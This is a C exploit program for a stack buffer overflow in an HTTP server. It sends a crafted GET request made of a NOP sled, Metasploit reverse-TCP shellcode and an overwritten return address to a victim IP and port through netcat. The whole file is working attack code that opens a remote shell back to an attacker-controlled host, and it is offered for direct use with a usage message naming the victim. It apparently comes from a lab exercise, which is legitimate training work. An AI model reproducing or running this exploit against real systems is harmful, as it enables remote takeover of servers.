#include <stdio.h>
#include <stdlib.h>
#include <string.h>


#define nop '\x90'

int main(int argc, char** argv)
{
	/* variable initializations */
	int i, ns1=711,ns2=122;
	char start[] = "GET / ";
	char end[] = " HTTP/1.0";
	char esp[] = "\x88\xf8\xff\xbf";
	char *nop1 = malloc(ns1);
	char *nop2 = malloc(ns2);
	
	memset(nop1, nop, ns1);
	memset(nop2, nop, ns2);

	/* checks for correct number of arguments */
	if(argc < 3)
	{
		printf("To few parameters, ./exploit [VICTIM IP ADDRESS] [PORT NUMBER]\n");
		exit(-1);
	}
	else if(argc > 3)
	{
		printf("To many parameters, ./exploit [VICTIM IP ADDRESS] [PORT NUMBER]\n");
                exit(-1);
	}


	


/*		personal
 * linux/x86/shell_reverse_tcp - 198 bytes
 * http://www.metasploit.com
 * Encoder: x86/alpha_mixed
 * VERBOSE=false, LHOST=192.168.149.128, LPORT=4441, 
 * ReverseConnectRetries=5, ReverseAllowProxy=false, 
 * PrependSetresuid=false, PrependSetreuid=false, 
 * PrependSetuid=false, PrependSetresgid=false, 
 * PrependSetregid=false, PrependSetgid=false, 
 * PrependChrootBreak=false, AppendExit=false, 
 * InitialAutoRunScript=, AutoRunScript=
 */
unsigned char buf[] = 
"\x89\xe5\xda\xcb\xd9\x75\xf4\x5e\x56\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x76\x51\x49\x4b\x59\x67\x39\x73\x62\x73\x63\x73\x62\x73\x51"
"\x7a\x45\x52\x6c\x49\x6b\x51\x6e\x50\x73\x56\x5a\x6d\x4b\x30"
"\x6e\x73\x32\x79\x38\x30\x77\x4f\x68\x4d\x6f\x70\x30\x49\x33"
"\x49\x38\x79\x62\x48\x6f\x30\x4c\x68\x4f\x65\x4f\x70\x52\x48"
"\x75\x52\x57\x70\x44\x51\x43\x69\x6c\x49\x6d\x31\x6c\x70\x72"
"\x46\x30\x50\x33\x61\x43\x63\x38\x33\x44\x43\x4c\x49\x6d\x31"
"\x5a\x6d\x6f\x70\x30\x52\x45\x38\x54\x6f\x56\x4f\x74\x33\x55"
"\x38\x75\x38\x46\x4f\x31\x72\x30\x69\x70\x6e\x6e\x69\x6a\x43"
"\x66\x32\x71\x43\x4c\x49\x79\x71\x4e\x50\x54\x4b\x4a\x6d\x6f"
"\x70\x41\x41";


/*	victim
 * linux/x86/shell_reverse_tcp - 198 bytes
 * http://www.metasploit.com
 * Encoder: x86/alpha_mixed
 * VERBOSE=false, LHOST=192.168.150.10, LPORT=1414, 
 * ReverseConnectRetries=5, ReverseAllowProxy=false, 
 * PrependSetresuid=false, PrependSetreuid=false, 
 * PrependSetuid=false, PrependSetresgid=false, 
 * PrependSetregid=false, PrependSetgid=false, 
 * PrependChrootBreak=false, AppendExit=false, 
 * InitialAutoRunScript=, AutoRunScript=
 */
unsigned char buf2[] = 
"\x89\xe1\xdb\xcb\xd9\x71\xf4\x5d\x55\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x46\x51\x4b\x6b\x4c\x37\x6b\x53\x36\x33\x73\x73\x50\x53\x42"
"\x4a\x44\x42\x4f\x79\x4b\x51\x4e\x50\x73\x56\x68\x4d\x6f\x70"
"\x6c\x53\x51\x49\x48\x30\x57\x4f\x38\x4d\x6d\x50\x47\x39\x71"
"\x69\x48\x79\x43\x58\x79\x50\x4e\x48\x5a\x36\x65\x5a\x75\x38"
"\x74\x42\x33\x30\x77\x75\x4e\x66\x4b\x39\x68\x61\x38\x30\x33"
"\x56\x62\x70\x42\x71\x42\x73\x48\x33\x33\x33\x6b\x39\x68\x61"
"\x58\x4d\x4b\x30\x61\x42\x62\x48\x56\x4f\x46\x4f\x50\x73\x33"
"\x58\x52\x48\x64\x6f\x65\x32\x51\x79\x32\x4e\x6c\x49\x39\x73"
"\x50\x52\x33\x63\x6e\x69\x69\x71\x4c\x70\x74\x4b\x58\x4d\x4b"
"\x30\x41\x41";


char *temp = malloc(2000);

/* builds exploit string */
strcat(temp, "echo '");
strcat(temp, start);
strcat(temp, nop1);
strcat(temp, buf2);
strcat(temp, nop2);
strcat(temp, esp);
strcat(temp, end);
strcat(temp, "'");
strcat(temp, "|");
strcat(temp, "nc ");
strcat(temp, argv[1]);
strcat(temp, " ");
strcat(temp, argv[2]);


/* run netcat command with exploit */
system(temp);

}
